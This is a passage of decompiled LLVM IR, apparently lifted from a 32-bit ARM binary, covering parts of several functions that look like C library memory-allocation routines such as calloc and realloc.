  store i32 %v0_1a490, i32* @r1, align 4
  %v0_1a494 = load i32, i32* @r4, align 4
  %v1_1a494 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a494 = add i32 %v1_1a494, 4
  %v3_1a494 = inttoptr i32 %v2_1a494 to i32*
  store i32 %v0_1a494, i32* %v3_1a494, align 4
  %v0_1a498 = load i32, i32* @r5, align 4
  store i32 %v0_1a498, i32* %r0.global-to-local, align 4
  %v0_1a49c = load i32, i32* @sl, align 4
  store i32 %v0_1a49c, i32* %r2.global-to-local, align 4
  %v3_1a4a0 = call i32 @function_14234(i32 %v0_1a498, i32 %v0_1a490, i32 %v0_1a49c)
  %v0_1a4a4 = load i32, i32* @r4, align 4
  %v1_1a4a4 = trunc i32 %v0_1a4a4 to i8
  %v2_1a4a4 = load i32, i32* @r5, align 4
  %v3_1a4a4 = load i32, i32* @sl, align 4
  %v4_1a4a4 = add i32 %v3_1a4a4, %v2_1a4a4
  %v5_1a4a4 = inttoptr i32 %v4_1a4a4 to i8*
  store i8 %v1_1a4a4, i8* %v5_1a4a4, align 1
  %v0_1a4a8 = load i32, i32* @sb, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1a4b0 = load i32, i32* @r8, align 4
  store i32 %v0_1a4b0, i32* %r2.global-to-local, align 4
  %v3_1a4b4 = inttoptr i32 %v0_1a4a8 to i8*
  %v4_1a4b4 = call i32 @function_1b3f8(i32 10, i8* %v3_1a4b4, i32 %v0_1a4b0)
  store i32 %v4_1a4b4, i32* %r0.global-to-local, align 4
  %v1_1a4b8 = load i32, i32* @r4, align 4
  %v9_1a4b8 = icmp eq i32 %v4_1a4b4, %v1_1a4b8
  br i1 %v9_1a4b8, label %dec_label_pc_1a4f0, label %dec_label_pc_1a4c0

dec_label_pc_1a4c0:                               ; preds = %dec_label_pc_1a478
  store i32 %v1_1a480, i32* @ip, align 4
  %v0_1a4c8 = load i32, i32* @r6, align 4
  store i32 %v0_1a4c8, i32* %v2_1a3c4, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_1a4d0 = load i32, i32* @r6, align 4
  %v2_1a4d0 = add i32 %v1_1a4d0, 8
  %v3_1a4d0 = inttoptr i32 %v2_1a4d0 to i32*
  store i32 10, i32* %v3_1a4d0, align 4
  %v0_1a4d4 = load i32, i32* @r4, align 4
  store i32 %v0_1a4d4, i32* %r0.global-to-local, align 4
  %v0_1a4d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a4d8 = add i32 %v0_1a4d8, 6
  store i32 %v1_1a4d8, i32* %r3.global-to-local, align 4
  %v1_1a4dc = load i32, i32* @r6, align 4
  %v2_1a4dc = add i32 %v1_1a4dc, 12
  %v3_1a4dc = inttoptr i32 %v2_1a4dc to i32*
  store i32 %v1_1a4d8, i32* %v3_1a4dc, align 4
  %v0_1a4e0 = load i32, i32* @r5, align 4
  %v1_1a4e0 = load i32, i32* @r6, align 4
  %v2_1a4e0 = inttoptr i32 %v1_1a4e0 to i32*
  store i32 %v0_1a4e0, i32* %v2_1a4e0, align 4
  %v0_1a4e4 = load i32, i32* @ip, align 4
  %v1_1a4e4 = load i32, i32* @r6, align 4
  %v2_1a4e4 = add i32 %v1_1a4e4, 16
  %v3_1a4e4 = inttoptr i32 %v2_1a4e4 to i32*
  store i32 %v0_1a4e4, i32* %v3_1a4e4, align 4
  %v0_1a4e8 = load i32, i32* @r4, align 4
  %v1_1a4e8 = load i32, i32* @fp, align 4
  %v2_1a4e8 = inttoptr i32 %v1_1a4e8 to i32*
  store i32 %v0_1a4e8, i32* %v2_1a4e8, align 4
  br label %dec_label_pc_1a604

dec_label_pc_1a4f0:                               ; preds = %dec_label_pc_1a478
  %v0_1a4f0 = load i32, i32* @r7, align 4
  %v2_1a4f0 = icmp eq i32 %v0_1a4f0, 0
  br i1 %v2_1a4f0, label %dec_label_pc_1a4f8, label %dec_label_pc_1a5f0

dec_label_pc_1a4f8:                               ; preds = %dec_label_pc_1a4f0
  %v2_1a4f8 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_1a4f8, i32* @r4, align 4
  store i32 %v2_1a4f8, i32* %r0.global-to-local, align 4
  store i32 40, i32* @r2, align 4
  %v2_1a508 = bitcast i32* %stack_var_-84 to i8*
  %v3_1a508 = call i32 @function_13ed0(i8* %v2_1a508, i32 0)
  store i32 %v3_1a508, i32* %r0.global-to-local, align 4
  %v2_1a510 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1a510, i32* @sb, align 4
  %v7_1a550 = icmp eq i32 %tmp9, 5
  br label %dec_label_pc_1a514

dec_label_pc_1a514:                               ; preds = %dec_label_pc_1a568, %dec_label_pc_1a4f8
  store i32 %v2_1a510, i32* %r2.global-to-local, align 4
  store i32 %v2_1a4f8, i32* %r3.global-to-local, align 4
  %v0_1a520 = load i32, i32* @r5, align 4
  store i32 %v0_1a520, i32* %r0.global-to-local, align 4
  %v4_1a524 = inttoptr i32 %v0_1a520 to i8*
  %v5_1a524 = call i32 @function_1bad4(i8* %v4_1a524, i32 28, i32 %v2_1a510, i32 %v2_1a4f8)
  store i32 %v5_1a524, i32* @r4, align 4
  %v1_1a528 = icmp slt i32 %v5_1a524, 0
  %v0_1a52c = load i32, i32* @sl, align 4
  store i32 %v0_1a52c, i32* %r2.global-to-local, align 4
  %v0_1a530 = load i32, i32* @r7, align 4
  %v1_1a530 = add i32 %v0_1a530, 1
  store i32 %v1_1a530, i32* @r7, align 4
  %v0_1a534 = load i32, i32* @r5, align 4
  store i32 %v0_1a534, i32* %r0.global-to-local, align 4
  br i1 %v1_1a528, label %dec_label_pc_1a5f0, label %dec_label_pc_1a53c

dec_label_pc_1a53c:                               ; preds = %dec_label_pc_1a514
  %v3_1a53c = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1a53c, i32* @r1, align 4
  %v3_1a540 = call i32 @function_14234(i32 %v0_1a534, i32 %v3_1a53c, i32 %v0_1a52c)
  %v3_1a544 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1a544, i32* @r0, align 4
  %v0_1a548 = call i32 @function_15850()
  store i32 %v0_1a548, i32* %r0.global-to-local, align 4
  %v0_1a554 = load i32, i32* @r4, align 4
  store i32 %v0_1a554, i32* %r2.global-to-local, align 4
  %v0_1a558 = load i32, i32* @r5, align 4
  store i32 %v0_1a558, i32* @r3, align 4
  br i1 %v7_1a550, label %dec_label_pc_1a560, label %dec_label_pc_1a598

dec_label_pc_1a560:                               ; preds = %dec_label_pc_1a53c
  %v0_1a560 = load i32, i32* @r7, align 4
  %v8_1a564 = icmp sgt i32 %v0_1a560, 5
  br i1 %v8_1a564, label %dec_label_pc_1a58c, label %dec_label_pc_1a568

dec_label_pc_1a568:                               ; preds = %dec_label_pc_1a560
  store i32 %tmp8, i32* @r1, align 4
  %v3_1a56c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1a56c, i32* %r0.global-to-local, align 4
  %v0_1a570 = load i32, i32* @sl, align 4
  %v5_1a574 = call i32 @function_1b9dc(i32 %v3_1a56c, i32 %tmp8, i32 %v0_1a554, i32 %v0_1a558, i32 %v0_1a570)
  store i32 %v5_1a574, i32* @r4, align 4
  %v3_1a57c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1a57c, i32* @r0, align 4
  %v0_1a580 = call i32 @function_15850()
  store i32 %v0_1a580, i32* %r0.global-to-local, align 4
  %v0_1a584 = load i32, i32* @r4, align 4
  %v1_1a584 = icmp slt i32 %v0_1a584, 0
  br i1 %v1_1a584, label %dec_label_pc_1a58c, label %dec_label_pc_1a514

dec_label_pc_1a58c:                               ; preds = %dec_label_pc_1a568, %dec_label_pc_1a560
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a5f8

dec_label_pc_1a598:                               ; preds = %dec_label_pc_1a53c
  %v7_1a598 = icmp eq i32 %tmp9, 28
  br i1 %v7_1a598, label %dec_label_pc_1a5a0, label %dec_label_pc_1a5e8

dec_label_pc_1a5a0:                               ; preds = %dec_label_pc_1a598
  store i32 16, i32* @r2, align 4
  %v0_1a5a8 = load i32, i32* @r8, align 4
  store i32 %v0_1a5a8, i32* @r0, align 4
  %v0_1a5ac = call i32 @function_14000()
  store i32 10, i32* %r3.global-to-local, align 4
  store i32 %v1_1a480, i32* %r2.global-to-local, align 4
  %v1_1a5b8 = load i32, i32* @r6, align 4
  %v2_1a5b8 = add i32 %v1_1a5b8, 8
  %v3_1a5b8 = inttoptr i32 %v2_1a5b8 to i32*
  store i32 10, i32* %v3_1a5b8, align 4
  %v0_1a5bc = load i32, i32* %r3.global-to-local, align 4
  %v1_1a5bc = add i32 %v0_1a5bc, 6
  store i32 %v1_1a5bc, i32* %r3.global-to-local, align 4
  %v1_1a5c0 = load i32, i32* @r6, align 4
  %v2_1a5c0 = add i32 %v1_1a5c0, 12
  %v3_1a5c0 = inttoptr i32 %v2_1a5c0 to i32*
  store i32 %v1_1a5bc, i32* %v3_1a5c0, align 4
  %v3_1a5c4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1a5c4, i32* @r0, align 4
  %v0_1a5c8 = load i32, i32* @r5, align 4
  %v1_1a5c8 = load i32, i32* @r6, align 4
  %v2_1a5c8 = inttoptr i32 %v1_1a5c8 to i32*
  store i32 %v0_1a5c8, i32* %v2_1a5c8, align 4
  %v0_1a5cc = load i32, i32* %r2.global-to-local, align 4
  %v1_1a5cc = load i32, i32* @r6, align 4
  %v2_1a5cc = add i32 %v1_1a5cc, 16
  %v3_1a5cc = inttoptr i32 %v2_1a5cc to i32*
  store i32 %v0_1a5cc, i32* %v3_1a5cc, align 4
  %v0_1a5d0 = call i32 @function_15850()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1a5e0 = load i32, i32* @r6, align 4
  store i32 %v0_1a5e0, i32* %v2_1a3c4, align 4
  %v0_1a5f8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a5f8

dec_label_pc_1a5e8:                               ; preds = %dec_label_pc_1a598
  %v3_1a5e8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1a5e8, i32* @r0, align 4
  %v0_1a5ec = call i32 @function_15850()
  store i32 %v0_1a5ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a5f0

dec_label_pc_1a5f0:                               ; preds = %dec_label_pc_1a514, %dec_label_pc_1a4f0, %dec_label_pc_1a5e8
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a5f8

dec_label_pc_1a5f8:                               ; preds = %dec_label_pc_1a5a0, %dec_label_pc_1a58c, %dec_label_pc_1a5f0
  %v0_1a5f8 = phi i32 [ %v0_1a5f8.pre, %dec_label_pc_1a5a0 ], [ 3, %dec_label_pc_1a58c ], [ 1, %dec_label_pc_1a5f0 ]
  %v1_1a5f8 = load i32, i32* @fp, align 4
  %v2_1a5f8 = inttoptr i32 %v1_1a5f8 to i32*
  store i32 %v0_1a5f8, i32* %v2_1a5f8, align 4
  br label %dec_label_pc_1a604

dec_label_pc_1a600:                               ; preds = %dec_label_pc_1a3b8, %dec_label_pc_1a3cc
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a604

dec_label_pc_1a604:                               ; preds = %bb, %bb30, %dec_label_pc_1a440, %dec_label_pc_1a424, %dec_label_pc_1a5f8, %dec_label_pc_1a4c0, %dec_label_pc_1a398, %dec_label_pc_1a600
  store i32 %v9_1a370, i32* @r6, align 4
  store i32 %v12_1a370, i32* @r7, align 4
  store i32 %v15_1a370, i32* @r8, align 4
  store i32 %v18_1a370, i32* @sb, align 4
  store i32 %v21_1a370, i32* @sl, align 4
  store i32 %v24_1a370, i32* @fp, align 4
  %v1_1a60c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1a60c

; uselistorder directives
  uselistorder i32 %v2_1a4f8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1a480, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1a454, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 2, 0, 3 }
  uselistorder i32 %tmp8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 4, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 18, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 15, 13, 14, 1, 16, 17, 20, 19, 21, 2, 22, 23, 0 }
  uselistorder i32 (i32, i32, i32)* @function_14234, { 1, 0, 2 }
  uselistorder i32 -24, { 3, 0, 2, 1 }
  uselistorder i32 %arg6, { 4, 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1a604, { 7, 4, 5, 1, 2, 3, 0, 6 }
  uselistorder label %dec_label_pc_1a600, { 1, 0 }
  uselistorder label %dec_label_pc_1a5f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a5f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a450, { 2, 1, 0 }
}

define i32 @function_1a610(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1a610:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_1a610 = load i32, i32* @r4, align 4
  %v6_1a610 = load i32, i32* @r5, align 4
  %v9_1a610 = load i32, i32* @r6, align 4
  %v12_1a610 = load i32, i32* @lr, align 4
  %v2_1a618 = icmp eq i32 %arg1, 0
  store i32 180260, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_1a628 = mul i32 %arg2, %arg1
  store i32 %v2_1a628, i32* @r6, align 4
  br i1 %v2_1a618, label %dec_label_pc_1a658, label %dec_label_pc_1a630

dec_label_pc_1a630:                               ; preds = %dec_label_pc_1a610
  store i32 %arg1, i32* @r1, align 4
  store i32 %v2_1a628, i32* @r0, align 4
  %v0_1a638 = call i32 @function_12418()
  %v0_1a63c = load i32, i32* @r4, align 4
  %v9_1a63c = icmp eq i32 %v0_1a63c, %v0_1a638
  br i1 %v9_1a63c, label %dec_label_pc_1a630.dec_label_pc_1a658_crit_edge, label %dec_label_pc_1a644

dec_label_pc_1a630.dec_label_pc_1a658_crit_edge:  ; preds = %dec_label_pc_1a630
  %v0_1a65c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a658

dec_label_pc_1a644:                               ; preds = %dec_label_pc_1a630
  %v0_1a644 = call i32 @function_12b24()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1a650 = inttoptr i32 %v0_1a644 to i32*
  store i32 12, i32* %v2_1a650, align 4
  br label %dec_label_pc_1a71c

dec_label_pc_1a658:                               ; preds = %dec_label_pc_1a630.dec_label_pc_1a658_crit_edge, %dec_label_pc_1a610
  %v0_1a674 = phi i32 [ %v0_1a65c.pre, %dec_label_pc_1a630.dec_label_pc_1a658_crit_edge ], [ 180260, %dec_label_pc_1a610 ]
  %v2_1a65c = add i32 %v0_1a674, 72
  %v3_1a65c = inttoptr i32 %v2_1a65c to i32*
  %v4_1a65c = load i32, i32* %v3_1a65c, align 4
  store i32 %v4_1a65c, i32* @r4, align 4
  %v2_1a674 = add i32 %v0_1a674, 76
  %v3_1a674 = inttoptr i32 %v2_1a674 to i32*
  %v4_1a674 = load i32, i32* %v3_1a674, align 4
  store i32 %v4_1a674, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1a674)
  %v0_1a688 = load i32, i32* @r5, align 4
  %v2_1a688 = add i32 %v0_1a688, 16
  %v3_1a688 = inttoptr i32 %v2_1a688 to i32*
  %v4_1a688 = load i32, i32* %v3_1a688, align 4
  store i32 %v4_1a688, i32* %ip.global-to-local, align 4
  store i32 108180, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1a688)
  %v0_1a694 = load i32, i32* @r6, align 4
  %v1_1a698 = call i32 @function_14ccc(i32 %v0_1a694)
  store i32 %v1_1a698, i32* %r4.global-to-local, align 4
  %v2_1a69c = icmp eq i32 %v1_1a698, 0
  br i1 %v2_1a69c, label %.thread, label %dec_label_pc_1a6a4

dec_label_pc_1a6a4:                               ; preds = %dec_label_pc_1a658
  %v1_1a6a4 = add i32 %v1_1a698, -4
  %v2_1a6a4 = inttoptr i32 %v1_1a6a4 to i32*
  %v3_1a6a4 = load i32, i32* %v2_1a6a4, align 4
  %v1_1a6a8 = and i32 %v3_1a6a4, 2
  %v2_1a6a8 = icmp eq i32 %v1_1a6a8, 0
  br i1 %v2_1a6a8, label %dec_label_pc_1a6b0, label %.thread

dec_label_pc_1a6b0:                               ; preds = %dec_label_pc_1a6a4
  %v1_1a6b07 = add i32 %v3_1a6a4, -4
  %v1_1a6b4 = and i32 %v1_1a6b07, -4
  store i32 %v1_1a6b4, i32* @r2, align 4
  %v3_1a6b8 = udiv i32 %v1_1a6b4, 4
  store i32 %v3_1a6b8, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_1a6b4, 36
  %v2_1a6c0 = icmp ult i32 %v1_1a6b4, 33
  %v3_1a6c0 = or i1 %tmp, %v2_1a6c0
  br i1 %v3_1a6c0, label %dec_label_pc_1a6cc, label %dec_label_pc_1a6c4

dec_label_pc_1a6c4:                               ; preds = %dec_label_pc_1a6b0
  %v2_1a6c4 = inttoptr i32 %v1_1a698 to i8*
  %v3_1a6c4 = call i32 @function_13ed0(i8* %v2_1a6c4, i32 0)
  br label %.thread

dec_label_pc_1a6cc:                               ; preds = %dec_label_pc_1a6b0
  %tmp8 = icmp eq i32 %v1_1a6b4, 16
  %v2_1a6d0 = inttoptr i32 %v1_1a698 to i32*
  store i32 0, i32* %v2_1a6d0, align 4
  %v1_1a6d4 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a6d4 = add i32 %v1_1a6d4, 4
  %v3_1a6d4 = inttoptr i32 %v2_1a6d4 to i32*
  store i32 0, i32* %v3_1a6d4, align 4
  %v1_1a6d8 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a6d8 = add i32 %v1_1a6d8, 8
  %v3_1a6d8 = inttoptr i32 %v2_1a6d8 to i32*
  store i32 0, i32* %v3_1a6d8, align 4
  %v2_1a6dc = icmp ult i32 %v1_1a6b4, 13
  %v3_1a6dc = or i1 %tmp8, %v2_1a6dc
  br i1 %v3_1a6dc, label %.thread, label %dec_label_pc_1a6e0

dec_label_pc_1a6e0:                               ; preds = %dec_label_pc_1a6cc
  %v0_1a6e0 = load i32, i32* %ip.global-to-local, align 4
  %v1_1a6e4 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a6e4 = add i32 %v1_1a6e4, 12
  %v3_1a6e4 = inttoptr i32 %v2_1a6e4 to i32*
  store i32 0, i32* %v3_1a6e4, align 4
  %v1_1a6e8 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a6e8 = add i32 %v1_1a6e8, 16
  %v3_1a6e8 = inttoptr i32 %v2_1a6e8 to i32*
  store i32 0, i32* %v3_1a6e8, align 4
  %tmp9 = icmp ult i32 %v0_1a6e0, 7
  br i1 %tmp9, label %.thread, label %dec_label_pc_1a6f0

dec_label_pc_1a6f0:                               ; preds = %dec_label_pc_1a6e0
  %v0_1a6f0 = load i32, i32* %ip.global-to-local, align 4
  %v7_1a6f0 = icmp eq i32 %v0_1a6f0, 9
  %v1_1a6f4 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a6f4 = add i32 %v1_1a6f4, 20
  %v3_1a6f4 = inttoptr i32 %v2_1a6f4 to i32*
  store i32 0, i32* %v3_1a6f4, align 4
  %v1_1a6f8 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a6f8 = add i32 %v1_1a6f8, 24
  %v3_1a6f8 = inttoptr i32 %v2_1a6f8 to i32*
  store i32 0, i32* %v3_1a6f8, align 4
  br i1 %v7_1a6f0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1a6f0
  %v2_1a6fc = load i32, i32* %r4.global-to-local, align 4
  %v3_1a6fc = add i32 %v2_1a6fc, 32
  %v4_1a6fc = inttoptr i32 %v3_1a6fc to i32*
  store i32 0, i32* %v4_1a6fc, align 4
  %v2_1a700 = load i32, i32* %r4.global-to-local, align 4
  %v3_1a700 = add i32 %v2_1a700, 28
  %v4_1a700 = inttoptr i32 %v3_1a700 to i32*
  store i32 0, i32* %v4_1a700, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1a6f0, %dec_label_pc_1a6a4, %dec_label_pc_1a6e0, %dec_label_pc_1a6cc, %dec_label_pc_1a658, %dec_label_pc_1a6c4, %bb
  %v0_1a710 = load i32, i32* @r5, align 4
  %v2_1a710 = add i32 %v0_1a710, 24
  %v3_1a710 = inttoptr i32 %v2_1a710 to i32*
  %v4_1a710 = load i32, i32* %v3_1a710, align 4
  store i32 %v4_1a710, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1a710)
  br label %dec_label_pc_1a71c

dec_label_pc_1a71c:                               ; preds = %dec_label_pc_1a644, %.thread
  %v0_1a71c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_1a610, i32* @r4, align 4
  store i32 %v6_1a610, i32* @r5, align 4
  store i32 %v9_1a610, i32* @r6, align 4
  store i32 %v12_1a610, i32* @lr, align 4
  ret i32 %v0_1a71c

; uselistorder directives
  uselistorder i32 %v1_1a6b4, { 0, 5, 1, 4, 3, 2 }
  uselistorder i32 %v1_1a698, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 13, { 0, 3, 4, 5, 1, 7, 2, 6 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1a71c, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_1a730(i32 %arg1) local_unnamed_addr {
dec_label_pc_1a730:
  %v0_1a730 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1a730, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1a730
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1a730, %bb
  %v10_1a740 = phi i32 [ %arg1, %dec_label_pc_1a730 ], [ 0, %bb ]
  ret i32 %v10_1a740

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @function_1a744(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1a744:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1a744 = load i32, i32* @r4, align 4
  %v6_1a744 = load i32, i32* @r5, align 4
  %v9_1a744 = load i32, i32* @r6, align 4
  %v12_1a744 = load i32, i32* @r7, align 4
  %v15_1a744 = load i32, i32* @r8, align 4
  %v18_1a744 = load i32, i32* @sb, align 4
  %v21_1a744 = load i32, i32* @sl, align 4
  %v24_1a744 = load i32, i32* @fp, align 4
  %v27_1a744 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_1a750 = icmp eq i32* %arg1, null
  store i32 180260, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1a750, label %dec_label_pc_1a764, label %dec_label_pc_1a774

dec_label_pc_1a764:                               ; preds = %dec_label_pc_1a744
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_1a768 = call i32 @function_14ccc(i32 %arg2)
  store i32 %v1_1a768, i32* %r0.global-to-local, align 4
  store i32 %v1_1a768, i32* @r4, align 4
  br label %dec_label_pc_1aacc

dec_label_pc_1a774:                               ; preds = %dec_label_pc_1a744
  %v2_1a774 = icmp eq i32 %arg2, 0
  br i1 %v2_1a774, label %dec_label_pc_1a77c, label %dec_label_pc_1a788

dec_label_pc_1a77c:                               ; preds = %dec_label_pc_1a774
  %v0_1a77c = call i32 @function_15850()
  store i32 %v0_1a77c, i32* %r0.global-to-local, align 4
  %v0_1a780 = load i32, i32* @r6, align 4
  store i32 %v0_1a780, i32* @r4, align 4
  br label %dec_label_pc_1aacc

dec_label_pc_1a788:                               ; preds = %dec_label_pc_1a774
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_1a790 = load i32, i32* inttoptr (i32 180332 to i32*), align 4
  store i32 %v4_1a790, i32* @r4, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_1a790, i32* %r2.global-to-local, align 4
  %v4_1a79c = load i32, i32* inttoptr (i32 180296 to i32*), align 8
  store i32 %v4_1a79c, i32* %r1.global-to-local, align 4
  %v2_1a7a0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1a7a0, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_1a7a8 = load i32, i32* inttoptr (i32 180336 to i32*), align 16
  call void @__pseudo_branch(i32 %v4_1a7a8)
  %v0_1a7b4 = load i32, i32* @r4, align 4
  store i32 %v0_1a7b4, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 180260, i32* %r1.global-to-local, align 4
  %v4_1a7c0 = load i32, i32* inttoptr (i32 180276 to i32*), align 4
  store i32 %v4_1a7c0, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_1a7cc.1068 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1a7c0)
  %v0_1a7cc = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_1a7cc, -32
  br i1 %tmp36, label %dec_label_pc_1a7e8, label %dec_label_pc_1a7d4

dec_label_pc_1a7d4:                               ; preds = %dec_label_pc_1a788
  %v0_1a7d4 = call i32 @function_12b24()
  store i32 %v0_1a7d4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1a7e0 = inttoptr i32 %v0_1a7d4 to i32*
  store i32 12, i32* %v2_1a7e0, align 4
  br label %dec_label_pc_1aacc

dec_label_pc_1a7e8:                               ; preds = %dec_label_pc_1a788
  %v1_1a7e8 = add i32 %v0_1a7cc, 11
  store i32 %v1_1a7e8, i32* %r0.global-to-local, align 4
  %v0_1a7ec = load i32, i32* @r5, align 4
  %v1_1a7ec = add i32 %v0_1a7ec, -4
  %v2_1a7ec = inttoptr i32 %v1_1a7ec to i32*
  %v3_1a7ec = load i32, i32* %v2_1a7ec, align 4
  store i32 %v3_1a7ec, i32* %r2.global-to-local, align 4
  %v2_1a7f0 = icmp ugt i32 %v1_1a7e8, 14
  %v7_1a7f0 = icmp eq i32 %v1_1a7e8, 15
  %v2_1a7f4 = xor i1 %v2_1a7f0, true
  %v3_1a7f4 = or i1 %v7_1a7f0, %v2_1a7f4
  br i1 %v3_1a7f4, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_1a7e8
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_1a7e8, %bb
  %v2_1a7f8 = xor i1 %v7_1a7f0, true
  %v3_1a7f8 = and i1 %v2_1a7f0, %v2_1a7f8
  br i1 %v3_1a7f8, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_1a7f8 = and i32 %v1_1a7e8, -8
  store i32 %v5_1a7f8, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_1a7fc = and i32 %v3_1a7ec, 2
  %v2_1a7fc = icmp eq i32 %v1_1a7fc, 0
  %v1_1a800 = add i32 %v0_1a7ec, -8
  store i32 %v1_1a800, i32* @sl, align 4
  %v1_1a804 = and i32 %v3_1a7ec, -4
  store i32 %v1_1a804, i32* @r6, align 4
  br i1 %v2_1a7fc, label %dec_label_pc_1a80c, label %dec_label_pc_1a9e4

dec_label_pc_1a80c:                               ; preds = %bb29
  %v1_1a80c = load i32, i32* @sb, align 4
  %v3_1a80c = icmp ult i32 %v1_1a804, %v1_1a80c
  br i1 %v3_1a80c, label %dec_label_pc_1a818, label %bb30

bb30:                                             ; preds = %dec_label_pc_1a80c
  store i32 %v1_1a804, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a97c

dec_label_pc_1a818:                               ; preds = %dec_label_pc_1a80c
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_1a820 = load i32, i32* inttoptr (i32 180292 to i32*), align 4
  store i32 %v4_1a820, i32* %r0.global-to-local, align 4
  %v1_1a824 = add i32 %v4_1a820, 44
  %v2_1a824 = inttoptr i32 %v1_1a824 to i32*
  %v3_1a824 = load i32, i32* %v2_1a824, align 4
  store i32 %v3_1a824, i32* %r3.global-to-local, align 4
  %v2_1a828 = add i32 %v1_1a804, %v1_1a800
  store i32 %v2_1a828, i32* @r4, align 4
  %v9_1a82c = icmp eq i32 %v2_1a828, %v3_1a824
  %v1_1a830 = add i32 %v2_1a828, 4
  %v2_1a830 = inttoptr i32 %v1_1a830 to i32*
  %v3_1a830 = load i32, i32* %v2_1a830, align 4
  store i32 %v3_1a830, i32* %r1.global-to-local, align 4
  br i1 %v9_1a82c, label %dec_label_pc_1a838, label %dec_label_pc_1a874

dec_label_pc_1a838:                               ; preds = %dec_label_pc_1a818
  %v1_1a838 = and i32 %v3_1a830, -4
  %v2_1a83c = add i32 %v1_1a838, %v1_1a804
